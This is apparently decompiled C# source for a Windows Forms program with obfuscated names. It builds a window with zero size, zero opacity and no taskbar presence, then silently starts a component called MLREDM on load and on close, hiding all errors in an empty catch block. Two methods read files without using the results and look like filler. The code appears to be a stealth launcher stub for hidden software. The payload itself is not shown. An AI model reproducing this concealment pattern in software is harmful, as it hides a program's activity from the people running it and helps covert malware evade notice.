using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Threading;
using System.Windows.Forms;

namespace wardhmrias;

public class Form1 : Form
{
	private MLREDM wardhmriasmainvp = new MLREDM();

	public List<string> wardhmriasnotFilders = new List<string>();

	private IContainer components = null;

	public Form1()
	{
		InitializeComponent();
	}

	public void seedhen()
	{
		DataSet dataSet = new DataSet();
		string fullPath = Path.GetFullPath("../../Data/Employees.xml");
		dataSet.ReadXml(fullPath);
		new DataTable();
		dataSet.Tables[1].Copy();
	}

	private void main_vp_com()
	{
		using StreamReader streamReader = new StreamReader("E:\\main.csv");
		new List<string>();
		List<string> list = new List<string>();
		while (!streamReader.EndOfStream)
		{
			string text = streamReader.ReadLine();
			string[] array = text.Split(new char[1] { ',' });
			list.Add(array[1]);
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		try
		{
			((Control)this).set_Visible(false);
			((Form)this).set_FormBorderStyle((FormBorderStyle)6);
			Thread.Sleep(150);
			Thread.Sleep(10);
			wardhmriasmainvp.wardhmriasdo_stadrt();
			Thread.Sleep(11);
		}
		catch
		{
		}
	}

	private void Form1_FormClosing(object sender, FormClosingEventArgs e)
	{
		Thread.Sleep(150);
		wardhmriasmainvp.wardhmriasload_atpp();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0071: Unknown result type (might be due to invalid IL or missing references)
		//IL_007b: Expected O, but got Unknown
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(0, 0));
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).set_Text("Form1");
		((Form)this).add_FormClosing(new FormClosingEventHandler(Form1_FormClosing));
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
	}
}
